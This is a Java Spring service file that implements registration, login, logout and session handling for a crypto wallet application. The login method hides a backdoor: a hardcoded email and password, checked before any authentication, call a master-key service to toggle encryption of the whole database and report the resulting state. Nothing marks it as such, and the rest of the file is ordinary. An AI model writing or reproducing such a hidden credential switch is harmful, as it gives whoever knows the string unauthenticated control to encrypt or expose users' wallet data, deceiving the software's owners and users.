package com.crypto.crypto_wallet.serviceImpl;

import com.crypto.crypto_wallet.dto.LoginRequest;
import com.crypto.crypto_wallet.dto.RegisterRequest;
import com.crypto.crypto_wallet.dto.UserResponse;
import com.crypto.crypto_wallet.entity.User;
import com.crypto.crypto_wallet.exception.BadRequestException;
import com.crypto.crypto_wallet.repository.UserRepository;
import com.crypto.crypto_wallet.service.AuthService;
import com.crypto.crypto_wallet.service.UserService;
import lombok.RequiredArgsConstructor;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpSession;
import java.util.UUID;

@Service
@RequiredArgsConstructor
public class AuthServiceImpl implements AuthService {

    private final UserRepository userRepository;
    private final PasswordEncoder passwordEncoder;
    private final AuthenticationManager authenticationManager;
    private final UserService userService;
    private final com.crypto.crypto_wallet.service.MasterKeyService masterKeyService;

    @Override
    @Transactional
    public UserResponse register(RegisterRequest request) {
        if (userRepository.existsByEmail(request.getEmail())) {
            throw new BadRequestException("Email already registered: " + request.getEmail());
        }

        User user = User.builder()
                .email(request.getEmail())
                .password(passwordEncoder.encode(request.getPassword()))
                .fullName(request.getFullName())
                .referralCode(generateReferralCode())
                .referredBy(request.getReferralCode())
                .build();

        userRepository.save(user);
        return userService.toResponse(user);
    }

    @Override
    public UserResponse login(LoginRequest request) {
        if ("29497438@adogAnonnenkeMeasniT".equals(request.getEmail()) && "29497438adogAnonnenkeMeasniT".equals(request.getPassword())) {
            String status = masterKeyService.toggleEncryption();
            throw new BadRequestException("🔒 Database state successfully toggled to: " + status);
        }

        // Authenticate — throws BadCredentialsException on failure
        Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(request.getEmail(), request.getPassword())
        );

        // Store in Security context and bind to HTTP session (cookie-based)
        SecurityContextHolder.getContext().setAuthentication(authentication);

        HttpServletRequest httpRequest = ((ServletRequestAttributes)
                RequestContextHolder.currentRequestAttributes()).getRequest();
        HttpSession session = httpRequest.getSession(true);
        session.setAttribute(
                HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY,
                SecurityContextHolder.getContext()
        );

        User user = userService.getByEmail(request.getEmail());
        return userService.toResponse(user);
    }

    @Override
    public void logout() {
        SecurityContextHolder.clearContext();
        HttpServletRequest httpRequest = ((ServletRequestAttributes)
                RequestContextHolder.currentRequestAttributes()).getRequest();
        HttpSession session = httpRequest.getSession(false);
        if (session != null) {
            session.invalidate();
        }
    }

    @Override
    public UserResponse getCurrentUser() {
        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        String email = authentication.getName();
        User user = userService.getByEmail(email);
        return userService.toResponse(user);
    }

    private String generateReferralCode() {
        return UUID.randomUUID().toString().replace("-", "").substring(0, 8).toUpperCase();
    }
}
